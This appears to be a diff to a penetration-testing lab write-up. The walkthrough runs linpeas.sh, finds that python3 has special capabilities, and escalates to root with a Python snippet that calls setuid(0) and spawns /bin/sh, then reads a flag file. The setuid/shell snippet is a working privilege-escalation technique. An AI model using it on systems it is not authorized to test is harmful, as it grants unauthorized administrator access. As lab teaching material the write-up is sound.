@@ -217,8 +217,10 @@ Follow these steps to get full system access:
 3. Make the file runnable with `chmod +x linpeas.sh` and run it using `./linpeas.sh`
     
     ![image 5](https://github.com/user-attachments/assets/edeb49e4-d45c-408a-9aa0-bc500747899f)
+    The scan results reveal that python3 has special capabilities that can be exploited for privilege escalation
+   ![image 9](https://www.notion.so/image/https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A583%2F1*80TUVX7Tunxh8aQM4Ir_9w.png?table=block&id=154de124-bd03-8047-bbe7-dd438c418402&spaceId=2183f36a-e508-4418-b721-25999831ea03&width=1120&userId=7df14aba-1ced-4583-917d-b8662bf07a1c&cache=v2)
     
-4. The scan shows we can use Python3's special permissions to gain administrator access
+5. The scan shows we can use Python3's special permissions to gain administrator access
 
 Here's how to get administrator (root) access using Python3:
 
@@ -230,10 +232,11 @@ import os
 os.setuid(0)
 os.system('/bin/sh')
 ```
-
-![image 6](https://github.com/user-attachments/assets/379cf231-1d34-4bff-845b-585349d995a9)
-
 What these commands do:
 
 - Change our user ID to 0 (root/administrator)
-- Open a new command prompt with full system access[Uploading Penetration Testing Assignment - Linux Distributio 1b4de124bd03808bbec6f865faf5e859.md…]()
+- Open a new command prompt with full system access
+- 
+![image 6](https://github.com/user-attachments/assets/379cf231-1d34-4bff-845b-585349d995a9)
+![image 6](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2183f36a-e508-4418-b721-25999831ea03%2F12620daa-db70-403b-bf2a-3372dfbec95d%2Fimage.png?table=block&id=154de124-bd03-8064-bd8d-da3b4967ac30&spaceId=2183f36a-e508-4418-b721-25999831ea03&width=1120&userId=7df14aba-1ced-4583-917d-b8662bf07a1c&cache=v2)
+To view the user flag, enter: `cat user.txt`
